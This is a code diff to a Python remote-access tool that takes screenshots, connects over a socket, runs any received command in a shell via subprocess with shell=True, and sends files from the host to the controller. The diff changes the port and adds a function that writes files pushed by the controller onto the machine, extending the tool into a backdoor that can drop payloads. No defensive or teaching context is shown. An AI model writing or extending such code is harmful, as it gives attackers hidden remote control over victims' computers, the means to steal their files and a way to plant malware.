@@ -7,7 +7,7 @@ import mss
 
 
 
-address = ("0.0.0.0", 3000)
+address = ("0.0.0.0", 55000)
 
 def take_screen_shot():
     if len(mss.mss().monitors) > 0:
@@ -19,6 +19,8 @@ def take_screen_shot():
 
 def recv(buff_size=1024):
     data_size = int(server_con.recv(12).decode())
+    if not data_size:
+        return
 
     data = bytes()
     while len(data) < data_size:
@@ -37,10 +39,19 @@ def upload_file(file_name):
         with open(file_name, "rb") as file:
             file_data = file.read()
             send(file_data)
-            
+
     except:
         print("Error opening file")
-    
+
+def download_file(file_name, file_path=os.getcwd()):
+    file_data = recv()
+    if not file_data:
+        return
+    print(file_path)
+    file = open(f"{file_path}{os.path.sep}{file_name}", "wb")
+    file.write(file_data)
+    file.close()
+
 def open_shell():
     while True:
         print("waiting for cmd...")
@@ -63,11 +74,13 @@ def open_shell():
             print(f"Uploading File...{file_name}")
             upload_file(file_name)
             continue
-            
+
         elif data.decode()[:2] == "up":
-            file_path = data.decode()[3:]
-            print(f"Downloading File...{file_path}")
-            
+            file_name = data.decode()[3:]
+            download_file(file_name)
+            print(f"Downloading File...{file_name}")
+            continue
+
         else:
             output = subprocess.Popen(f'{data.decode()}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
             str_msg = output[0].decode()
